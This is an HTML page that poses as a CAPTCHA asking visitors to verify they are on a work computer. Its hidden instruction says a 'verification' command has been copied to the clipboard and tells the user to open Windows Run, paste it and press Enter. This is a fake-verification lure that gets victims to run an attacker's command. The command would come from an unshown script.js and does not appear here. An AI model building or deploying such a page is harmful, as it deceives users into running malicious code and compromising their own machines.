<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Work Computer Verification</title>
    <link rel="stylesheet" href="styles.css">
    <script src="script.js" defer></script>
</head>
<body>
    <div class="captcha-container">
        <h2 class="captcha-title">Please verify you're on a work computer</h2>

        <div id="captchaBox" class="captcha-box" onclick="startVerification()">
            <div id="captchaText" class="captcha-text">Click to verify you're human</div>
        </div>

        <button id="verifyButton" class="verify-button" onclick="verifyCaptcha()">Verify</button>

        <div id="resultMessage" class="result-message"></div>
        
        <div class="command-instructions" style="display: none;">
            <p>Your command has been copied to the clipboard. Please press <b>Windows + R</b>, then <b>Ctrl + V</b> and hit <b>Enter</b> to execute the verification.</p>
        </div>
    </div>
</body>
</html>
